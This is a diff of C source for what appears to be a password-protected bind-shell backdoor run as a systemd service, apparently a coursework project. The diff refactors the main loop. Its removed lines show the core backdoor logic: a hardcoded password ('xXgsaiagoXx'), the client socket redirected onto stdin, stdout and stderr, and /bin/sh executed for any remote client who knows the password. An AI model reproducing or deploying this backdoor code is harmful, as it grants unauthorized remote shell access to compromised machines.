@@ -1,64 +1,56 @@
 #include "payload.h"
 #include <string.h>
+#include <systemd/sd-journal.h>
+#include <unistd.h>
 
 int main(void) {
-	int	  listener;
-	int	  client;
-	pid_t pid;
-	char  password[] = "xXgsaiagoXx";
+	int		   listener;
+	int		   client_fd;
+	pid_t	   pid;
+	pid_t	   main_pid = getpid();
+	const char password[] = "xXgsaiagoXx";
 
 	listener = create_listener();
 	if (listener < 0) {
-		sd_notifyf(0, "STOPPING=1\nEXIT_STATUS=1\nERRNO=%d", errno);
+		NotifyStoppingf(
+			main_pid, "Failed to create listener: %s", strerror(errno));
 		return (1);
 	}
 	if (install_sigchld_handler() != 0) {
-		Err("Failed accept new client");
-		sd_notifyf(0, "STOPPING=1\nEXIT_STATUS=1\nERRNO=%d", errno);
+		NotifyStoppingf(
+			main_pid, "Failed to install sigchld handler: %s", strerror(errno));
+		close(listener);
 		return (1);
 	}
 	while (42) {
-		client = accept(listener, NULL, NULL);
-		if (client < 0) {
+		client_fd = accept(listener, NULL, NULL);
+		if (client_fd < 0) {
 			Err("Failed to accept new client");
-			sd_notifyf(0, "STOPPING=1\nEXIT_STATUS=1\nERRNO=%d", errno);
+			NotifyStoppingf(
+				main_pid, "Failed to accept a new client: %s", strerror(errno));
+			close(listener);
 			return (1);
 		}
 		if (client_buffer_has_seat() != 0) {
 			Debug("The buffer has no seats available, refusing new client");
-			close(client);
+			close(client_fd);
 			continue;
 		}
 
 		pid = fork();
 		if (pid < 0) {
-			Err("Failed accept new client");
-			sd_notifyf(0, "STOPPING=1\nEXIT_STATUS=1\nERRNO=%d", errno);
-			return (1);
+			Err("Failed to fork process to handle new client");
+			write(client_fd, "failed to handle your connection\n", 34);
+			close(client_fd);
+			continue;
 		}
 		if (pid == 0) {
-			char password_buff[20] = {0};
-			Debug("Starting new client");
-			dup2(client, STDIN_FILENO);
-			dup2(client, STDOUT_FILENO);
-			dup2(client, STDERR_FILENO);
-			if (read_with_timeout(client, password_buff,
-								  sizeof(password_buff) - 1, 10) <= 0) {
-				Warn("client timed out after 10 seconds on password");
-				close(client);
-				return (-1);
-			}
-			if (strncmp(password_buff, password, sizeof(password) - 1) != 0) {
-				Warn("client inputted wrong password");
-				write(client, "wrong password\n", 16);
-				close(client);
-				return (-1);
-			}
-			if (execl("/bin/sh", "sh", NULL) != -1) {
-				Err("execl failed");
+			if (handle_client(password, client_fd) != 0) {
+				close(client_fd);
+				return (1);
 			}
 		}
 		client_buffer_acquire_seat(pid);
-		close(client); // avoid leak on parent process
+		close(client_fd); // avoid leak on parent process
 	}
 }
